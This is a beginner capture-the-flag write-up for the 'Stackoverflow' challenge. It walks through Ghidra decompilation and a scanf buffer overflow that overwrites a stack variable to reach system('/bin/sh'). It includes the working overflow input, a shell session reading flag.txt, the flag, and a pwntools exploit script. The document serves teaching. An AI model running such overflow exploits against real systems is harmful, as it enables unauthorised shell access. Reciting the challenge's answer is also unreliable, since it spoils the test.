# Stackoverflow

The description for this challenge is as follows:

*Welcome to Stack Overflow! Get answers to all your programming questions right here!*

This challenge was worth 50 points, and it had 413 solves. It should be suitable for absolute beginners in binary exploitation, so this writeup will assume that the reader has virtually no pre-existing knowledge. Feel free to download the binary and play along at home!

## Background Information

In terms of tooling for these types of challenges, I would recommend you run some flavor of Linux; I personally tend to use a mixture of Kali and Ubuntu for binary exploitation generally speaking. 

I would strongly recommend that you get the decompiler Ghidra. The Python library pwntools and the GEF wrapper for GDB are also great, but I didn't end up referencing them heavily in this writeup.

## Information Gathering

A good first step when performing binary exploitation is to run the challenge binary, either remotely or locally, and see what it does. In this case, the program is simple; it prints out some sentences, asks for user input, prints out a few more sentences, then ends.
```
knittingirl@piglet:~/CTF/imaginaryCTF$ nc chal.imaginaryctf.org 42001
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
red
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET

```
To get a better idea of what this program is actually doing, we can open it up in Ghidra. Ghidra is a decompiler, which means that you can give it an executable file, and it can produce a sort of pseudo-C code based on that file. In this case, you can open up main from the symbol tree to get an idea of what is going one.

```
undefined8 main(void)

{
  undefined local_38 [40];
  long local_10;
  
  local_10 = 0x42424242;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts(
      "Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, wewould like you to answer a question. What\'s your favorite color?"
      );
  __isoc99_scanf(%s,local_38);
  puts("Thanks! Now onto the posts!");
  if (local_10 == 0x69637466) {
    puts("DEBUG MODE ACTIVATED.");
    system("/bin/sh");
  }
  else {
    puts("ERROR: FEATURE NOT IMPLEMENTED YET");
  }
  return 0;
}
```
Here is some additional background information that you need to know. local_10 and local_38 are local variables on the stack. If you've programmed in C before, this is sort of the default storage area for local variables. The stack pointer (the rsp register in x86-64) points to the top of the stack, while the base pointer (rbp register in x86-64) points to the bottom of the stack. The local stack variables are situated between the two. The locations of these variables can be described in terms of their offset from rbp; local_38 is situated at rbp-0x30, and local_10 is situated at rbp-0x10; Ghidra has a consistent naming convention, plus you can cross-reference the decompilation with lines from the decompilation like:
```
        00100812 48 8d 45 d0     LEA        RAX=>local_38,[RBP + -0x30]

```
When we look at the decompiled code, we can see that the function __isoc99_scanf is reading a user-provided string into the local_38 variable. There is then a check on the value of local_10 to see if it translates to a hex value of 0x66746369. This is ASCII that corresponds to the string "ftci"; you can copy-paste the hex into CyberChef and select the from hex option. If the comparison is successful, then it will call system("/bin/sh"); this will allow us to run terminal commands on the target system, which is typically the goal of binary exploitation challenges. The problem is that if the program runs normally, local_10 will automatically equal 0x42424242, and there is nothing we can do about it!

Fortunately, a buffer overflow can solve this issue. Basically, in this case, __isoc99_scanf is not placing any limit on the number of characters that it will read into local_38, but only 40 bytes have been allocated to it on the stack. This means that if we input more than 40 characters, it will start to overflow into higher address values, closer to rbp, because of the whole "the stack grows downwards" thing. local_10, at rbp-0x8, will be in the path of this overflow, so we can reset its value simply by inputting more than 40 characters. 

## Writing the Exploit

To perform the overflow, we first input 40 characters of absolutely anything; I typically just go for a bunch of a's. We then need to add the value that we want for local_10 at the end. As a result, we could derive the flag like this:
```
knittingirl@piglet:~/CTF/imaginaryCTF$ nc chal.imaginaryctf.org 42001
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaftci
Thanks! Now onto the posts!
DEBUG MODE ACTIVATED.
ls
flag.txt
run
cat flag.txt
ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
```
I have also included a Python pwntools script that will accomplish the same thing in a more automated fashion, which you will definitely want to look into if you go much further!
```
from pwn import *

#target = process('./stackoverflow')

target = remote('chal.imaginaryctf.org', 42001)

print(target.recvuntil(b'color?'))

payload = b'a' * 40
payload += p64(0x69637466)
print(payload)

target.sendline(payload)

target.interactive()
```

Thanks for reading!









